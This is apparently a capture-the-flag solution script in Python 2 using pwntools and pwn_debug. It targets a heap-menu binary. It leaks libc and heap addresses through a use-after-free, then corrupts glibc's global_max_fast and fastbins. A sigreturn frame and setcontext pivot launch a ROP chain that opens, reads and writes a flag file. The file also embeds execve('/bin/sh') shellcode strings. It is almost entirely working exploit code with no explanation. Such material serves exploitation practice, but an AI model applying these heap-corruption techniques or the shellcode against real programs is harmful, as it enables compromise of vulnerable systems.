from pwn_debug import *
import time
pdbg=pwn_debug("pwn")
pdbg.context.terminal=['tmux', 'splitw', '-h']
context.log_level='debug'
pdbg.local("")
pdbg.remote()

switch=1
if switch==1:
    p=pdbg.run("local")
elif switch==2:
    p=pdbg.run("debug")
elif switch==3:
    p=pdbg.run("remote")
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
sl      = lambda data               :p.sendline(str(data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\x00'))
uu64    = lambda data   :u64(data.ljust(8, '\x00'))
bp      = lambda bkp                :pdbg.bp(bkp)
def bpp(m=[]):
    bp(m)
    input()
#elf=pdbg.elf
libc=pdbg.libc
sh_x86_18="x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x86_20="x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
sh_x64_21="xf7xe6x50x48xbfx2fx62x69x6ex2fx2fx73x68x57x48x89xe7xb0x3bx0fx05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def add(idx, size, cont='a'):
    ru('Choice:')
    sl('1')
    ru('input your index:\n')
    sl(str(idx))
    ru('input your size:\n')
    sl(str(size))
    ru('input your context:')
    sl(cont)

def dele(idx):
    ru('Choice:')
    sl('2')
    ru('input your index:\n')
    sl(str(idx))

def show(idx):
    ru('Choice:')
    sl('3')
    ru('input your index:\n')
    sl(str(idx))

def change(idx):
    ru('Choice:')
    sl('4')
    ru('input your index:\n')
    sl(str(idx))


add(0,0x88)
add(1,0x88)#unsorted attack
add(2,0x88,flat([0,0x21])*8)
add(3,0x88)#fast attack
add(4,0x100,flat([0,0x21])*16)
add(15,0x100,flat([0,0x21])*16)
dele(0)
show(0)
ru(': ')
libc_base=uu64(r(6))+0x00007f3995723000-0x7f3995ae7b78
print "libc_base: "+hex(libc_base)

dele(2)
show(2)
ru(': ')
heap_base=uu64(r(6))-0x230
print "heap_base: "+hex(heap_base)
global_max_fast_addr=libc_base+0x7ff29c9907f8-0x00007ff29c5ca000

dele(1)
dele(3)
dele(4)

add(5,0x340,'\x00'*0x88+p64(0x91)+flat([0,0x21])*8+'\x00'*8+p64(0x91)+'\x00'*0x88+p64(0x231))
dele(5)
dele(1)

#global max fast attack here
add(6,0x340,'\x00'*0x88+p64(0x91)+p64(0)+p64(global_max_fast_addr-0x10))
add(7,0x80)
dele(6)



buffer_addr=heap_base+0x240
pop_rdx=0x0000000000001b92+libc_base
pop_rdi=0x0000000000021112+libc_base
pop_rsi_1=0x0000000000021110+libc_base

flag_str_addr=buffer_addr+0xb0
setcontext=libc_base+libc.sym['setcontext']+53
flag_addr=buffer_addr+0xc0
func_open=libc.sym['open']+libc_base
func_read=libc.sym['read']+libc_base
func_write=libc.sym['write']+libc_base

rop_chain=flat([
    flag_str_addr,
    pop_rsi_1,
    0,
    0,
    func_open,
    pop_rdi,
    4,
    pop_rsi_1,
    flag_addr,
    0,
    pop_rdx,
    0x30,
    func_read,
    pop_rdi,
    2,
    pop_rsi_1,
    flag_addr,
    0,
    pop_rdx,
    0x30,
    func_write
])
rop_chain=rop_chain.ljust(0xb0,'\x00')+'flag\x00\x00\x00\x00'+p64(setcontext)
rop_chain=rop_chain.ljust(0x100,'\x00')


#fastbin attack here
dele(3)
add(8,0x340,'\x00'*0x88+p64(0x91)+flat([0,0x21])*8+'\x00'*8+p64(0x91)+'\x00'*0x88+p64(0x231)+p64(heap_base))
add(9,0x228)
s=SigreturnFrame()
s.rsp=heap_base+0x240 #pivot stack here
s.rip=pop_rdi
s=str(s)
pay=s[:0x88]+p64(heap_base+0xf0)+s[0x90:0xd8]+p64(heap_base+0x240+0xb8-0x40)+s[0xe0:]

add(10,0x228,pay)

#layout
dele(8)
add(11,0x340,rop_chain)
change(0)

it()
